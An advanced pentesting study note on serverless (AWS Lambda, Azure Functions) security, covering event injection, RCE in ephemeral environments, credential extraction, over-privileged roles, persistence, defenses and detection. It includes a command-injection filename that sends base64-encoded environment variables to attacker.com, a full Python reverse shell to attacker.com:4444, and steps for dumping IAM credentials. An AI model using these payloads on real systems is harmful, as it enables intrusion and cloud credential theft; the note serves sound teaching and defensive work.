---
tags: [serverless, aws-lambda, azure-functions, cloud-security, pentesting, rce]
difficulty: advanced
module: "37 - Cloud Infrastructure"
topic: "37.28 Serverless Testing"
---

# 28 - Serverless Security Testing

## Introduction to Serverless Architectures

Serverless computing allows developers to build and run applications without managing servers or infrastructure. The cloud provider dynamically manages the allocation and provisioning of servers. The most common implementations are Function-as-a-Service (FaaS) offerings like AWS Lambda, Azure Functions, and Google Cloud Functions.

From a penetration testing perspective, serverless shifts the attack surface. Traditional infrastructure attacks (like exploiting an outdated SSH daemon or an unpatched Linux kernel) are no longer viable because the underlying host is managed by the cloud provider. However, the application layer, the IAM permissions, and the cloud misconfigurations become the primary targets.

When an attacker successfully exploits a serverless function, the goal is typically not to maintain a long-term shell (since functions are ephemeral and die after execution), but rather to extract the function's underlying IAM permissions, steal environment variables, or establish persistence via cloud API manipulation.

## The Serverless Attack Surface

The attack surface of a serverless application can be visualized as follows:

```text
+-----------------------+      +-------------------------+      +--------------------------+
|  Event Triggers       |      |   Serverless Function   |      |   Downstream Resources   |
|-----------------------|      |-------------------------|      |--------------------------|
| - API Gateway         | ===> | - Application Code      | ===> | - S3 Buckets / Storage   |
| - S3 Upload Event     |      | - 3rd Party Libraries   |      | - DynamoDB / SQL DBs     |
| - SQS Queue Message   |      | - Environment Variables |      | - Internal APIs          |
| - EventBridge / Cron  |      | - Executing Identity    |      | - External Internet      |
+-----------------------+      +-----------+-------------+      +--------------------------+
                                           |
                                           v
                               +-----------+-------------+
                               |   Cloud Control Plane   |
                               |-------------------------|
                               | - IAM / Azure AD        |
                               | - Secrets Manager       |
                               | - CloudTrail Logs       |
                               +-------------------------+
```

## Vulnerability Vectors

### 1. Event Data Injection

Serverless functions are triggered by events. These events pass data into the function, usually as a JSON object (the `event` parameter in AWS Lambda, or the `req` object in Azure Functions).

If the application code does not properly sanitize this event data, it is vulnerable to injection attacks. Because triggers can come from many sources (not just HTTP), the injection vectors are diverse.

**Examples of Triggers and Payloads:**
- **S3 Uploads**: An application resizes images uploaded to an S3 bucket. The function reads the filename. If the filename is `image.jpg; curl http://attacker.com/$(env | base64)`, and the application passes this directly to a system shell command, Command Injection occurs.
- **SQS Queues**: A function processes messages from a queue. If the message payload contains serialized objects (like Python `pickle` or Java serialization), it may be vulnerable to insecure deserialization.
- **API Gateway**: Standard HTTP attacks (SQLi, XSS, SSRF) apply here if the API Gateway passes user input directly to the function.

### 2. Remote Code Execution (RCE) in Ephemeral Environments

Achieving RCE in a serverless function is different from a standard VM. The environment is highly restricted:
- **Read-Only Filesystem**: In AWS Lambda, the root filesystem is read-only. You can only write to the `/tmp` directory.
- **No Inbound Networking**: You cannot bind a port and listen for a reverse shell. You must use egress connections.
- **Ephemeral Nature**: The container will be destroyed shortly after the function completes. If your reverse shell blocks the function from returning, the cloud provider will time it out and kill the process.

**Reverse Shell Technique (Python Lambda):**
To get a reverse shell, you must fork a process or run the shell in the background so the function can complete its normal execution, or you must quickly execute your commands and exfiltrate data before the timeout.

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("attacker.com",4444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
*Note: Due to timeouts, standard reverse shells are often unreliable. Attackers prefer executing single commands and exfiltrating via HTTP or DNS.*

### 3. Environment Variable Extraction

The most valuable target in a serverless function is its environment variables. Developers frequently store sensitive information here, such as API keys, database passwords, or third-party tokens.

More importantly, the cloud provider injects temporary IAM credentials directly into the environment variables.

**AWS Lambda Injected Variables:**
- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_SESSION_TOKEN`

If an attacker achieves RCE, Command Injection, or Local File Inclusion (LFI), their first action is to dump the environment variables.
- Command Injection: `env` or `printenv`
- LFI: Reading `/proc/self/environ`

Once these keys are extracted, the attacker configures their local AWS CLI and pivots into the cloud environment, assuming the identity of the Lambda function.

### 4. Over-Privileged Execution Roles

Serverless functions require an IAM role to interact with other cloud services. A massive vulnerability is the assignment of overly broad permissions to these functions.

A classic example: A Lambda function is designed to read an image from an S3 bucket and write a thumbnail back to the same bucket.
- **Secure Policy**: Allow `s3:GetObject` and `s3:PutObject` strictly on `arn:aws:s3:::thumbnail-bucket/*`.
- **Vulnerable Policy**: Developer grants `AmazonS3FullAccess` to the function to "make it work quickly."

If an attacker compromises this function via injection, they extract the keys and now possess `AmazonS3FullAccess`. They can exfiltrate data from *every* bucket in the account.

### 5. Dependency Vulnerabilities

Serverless functions often rely on hundreds of third-party libraries (npm packages, pip modules). Because functions are deployed as immutable ZIP files or container images, dependencies are rarely updated unless the function is actively maintained.

Tools like `npm audit` or `safety` are crucial. Attackers will look for known vulnerabilities (like prototype pollution in Node.js or deserialization in Python libraries) to exploit the function without needing a flaw in the custom application code.

## Persistence Mechanisms

Since the execution environment is ephemeral, traditional persistence (like adding a cron job or an SSH key to the VM) fails. Persistence in serverless relies on manipulating the Cloud Control Plane.

If the compromised function's IAM role has permissions to modify cloud resources, the attacker can:
1. **Modify the Function Code**: Use `lambda:UpdateFunctionCode` to insert a backdoor directly into the function's source code. Every time the function executes legitimately, the backdoor runs.
2. **Create New Triggers**: Add a new API Gateway trigger or CloudWatch Event to execute the backdoored function on demand.
3. **IAM Backdoors**: If the function has `iam:CreateUser` permissions, create a permanent backdoor user.
4. **Lambda Layers**: Inject malicious code into a Lambda Layer that is shared across multiple functions, effectively backdooring the entire application stack.

## Defense and Mitigation

Defending serverless applications requires strict adherence to secure coding practices and cloud security posture management.

### 1. Strict Principle of Least Privilege
This is the most critical defense. Every function must have its own unique IAM role. The role must grant the absolute minimum permissions required to perform its task, restricted by action, resource ARN, and condition keys.

### 2. Input Validation Everywhere
Do not assume that because an event comes from an internal source (like SQS or S3) that it is safe. S3 filenames, DynamoDB records, and API payloads must be strictly validated and parameterized before being processed, especially before being passed to SQL queries, system commands, or deserializers.

### 3. Secrets Management
Never store database passwords or API keys in environment variables. Use a dedicated secrets manager like AWS Secrets Manager, Azure Key Vault, or HashiCorp Vault. The function should retrieve the secret at runtime using its IAM role. This ensures that even if environment variables are dumped, the static secrets are not exposed (though the IAM keys to fetch them still will be).

### 4. Dependency Scanning in CI/CD
Implement automated dependency scanning in the deployment pipeline. Block deployments of functions containing libraries with known critical CVEs.

## Detection Engineering

Detecting serverless attacks is heavily reliant on CloudTrail logs and application performance monitoring (APM).

- **Execution Duration Anomalies**: A function that normally takes 200ms suddenly taking 14.9 seconds (near the 15-second timeout) might indicate an attacker running a blocking reverse shell or exfiltrating data.
- **Concurrent Execution Spikes**: A sudden spike in invocations could indicate a Denial of Wallet (DoW) attack or an attacker brute-forcing an injection vulnerability.
- **CloudTrail Anomalies**: The highest fidelity alert is when the temporary credentials assigned to a Lambda function (identified by the role session name containing the function name) are used from an IP address outside of the AWS IP ranges. This definitively proves the credentials were stolen and are being used externally.
- **Unexpected Egress**: Monitor VPC Flow Logs for Lambda functions making outbound connections to unknown IP addresses or custom ports (like 4444).

## Chaining Opportunities

- **Initial Access**: Vulnerabilities here often lead to credential theft, linking directly to `[[24 - Cloud Metadata Endpoint Cheat Sheet]]` concepts, but via environment variables rather than IMDS.
- **Privilege Escalation**: Once keys are stolen, attackers use `[[26 - Cloud Enumeration Tools]]` to find the next target.
- **SSRF**: Functions are prime targets for SSRF attacks to hit internal APIs, relating to `[[27 - Cloud SSRF to Credential Theft — Full Chain]]`.

## Deep Dive: Advanced Real-World Scenarios and Case Studies

In advanced penetration testing engagements, simplistic vulnerabilities are rarely found in isolation. Instead, attackers must chain multiple low-severity issues to achieve critical impact. The complexity of modern cloud architectures often obscures these attack paths from defenders, while providing numerous opportunities for patient adversaries.

Consider a scenario where an organization implements strict IAM policies but neglects network-level egress controls. An attacker might exploit a minor Server-Side Request Forgery (SSRF) vulnerability that, due to strict IAM, yields a token with seemingly useless permissions. However, by thoroughly enumerating the environment using tools discussed previously, the attacker discovers an obscure, legacy API endpoint internal to the VPC. This endpoint, trusting any request originating from within the network, allows the attacker to manipulate database records.

This illustrates a fundamental principle in cloud security: identity is the new perimeter, but network controls still provide critical defense-in-depth. A failure in either domain can lead to a complete compromise.

Furthermore, the operational tempo of cloud deployments—where Infrastructure as Code (IaC) pipelines deploy changes multiple times a day—frequently introduces transient vulnerabilities. A permission granted temporarily for debugging might be accidentally committed to the main branch, exposing a highly privileged role for just a few hours. Advanced adversaries automate their reconnaissance to detect and exploit these fleeting windows of opportunity.

To combat this, defensive teams must adopt an "assume breach" mentality. This means implementing continuous monitoring of control plane logs (like AWS CloudTrail or Azure Activity Logs), utilizing anomaly detection to spot unusual API call patterns, and conducting regular red team exercises to validate the effectiveness of security controls. The notes in this module provide the offensive perspective necessary to design these robust, resilient cloud architectures.

### The Role of Infrastructure as Code (IaC) in Security Posture

Modern cloud infrastructure is almost entirely defined by code using tools like Terraform, Pulumi, or AWS CloudFormation. While IaC brings immense benefits in terms of reproducibility and scale, it also codifies vulnerabilities if not properly secured. A single misconfiguration in a Terraform module—such as overly permissive security group rules or an exposed storage bucket—can be replicated across dozens of environments instantly.

During penetration tests, gaining access to the IaC repository is often a critical objective. Analyzing the code provides a comprehensive map of the target environment without needing to interact with the cloud provider's APIs, avoiding detection by logging mechanisms like CloudTrail. Furthermore, identifying hardcoded credentials or overly broad IAM roles within the IaC code can highlight direct paths to privilege escalation.

Securing IaC requires integrating security scanning tools directly into the CI/CD pipeline. Solutions like Checkov, tfsec, or OPA (Open Policy Agent) can automatically enforce security policies and block deployments that violate organizational standards. By shifting security left and addressing vulnerabilities at the code level, organizations can prevent misconfigurations from ever reaching production environments.

### Zero Trust Architecture in the Cloud

The concept of Zero Trust is fundamental to modern cloud security. Unlike traditional perimeter-based security models, Zero Trust assumes that the network is always hostile and that internal traffic is no more trustworthy than external traffic. Every request must be authenticated, authorized, and continuously validated, regardless of its origin.

In the context of cloud infrastructure, implementing Zero Trust involves several key practices:
- **Micro-segmentation:** Dividing the cloud environment into small, isolated zones to limit lateral movement in the event of a breach.
- **Identity-Aware Proxy (IAP):** Using a proxy to verify the identity and context of every request before granting access to internal applications.
- **Continuous Monitoring:** Analyzing logs and network traffic in real-time to detect anomalous behavior and respond to threats quickly.
- **Just-in-Time (JIT) Access:** Granting privileges only when they are needed and revoking them immediately after the task is completed, minimizing the window of opportunity for an attacker.

By adopting a Zero Trust mindset, organizations can significantly enhance their resilience against advanced threats and minimize the impact of potential security incidents.

### Summary of the Threat Landscape

The cloud threat landscape is constantly evolving, with attackers continually developing new techniques to bypass security controls. As cloud environments become more complex, the potential attack surface expands, making it increasingly challenging to secure.

Organizations must stay vigilant and continuously adapt their security posture to address emerging threats. This requires a proactive approach, incorporating regular security assessments, penetration testing, and threat modeling. By understanding the tactics, techniques, and procedures (TTPs) used by adversaries, defenders can implement targeted mitigations and improve their overall security posture.

Ultimately, cloud security is a shared responsibility between the cloud provider and the customer. While the provider is responsible for securing the underlying infrastructure, the customer is responsible for securing their applications, data, and configurations. Understanding this shared responsibility model is essential for designing and maintaining a secure cloud environment.

## Related Notes

- `[[26 - Cloud Enumeration Tools]]`
- `[[24 - Cloud Metadata Endpoint Cheat Sheet]]`
- `[[27 - Cloud SSRF to Credential Theft — Full Chain]]`
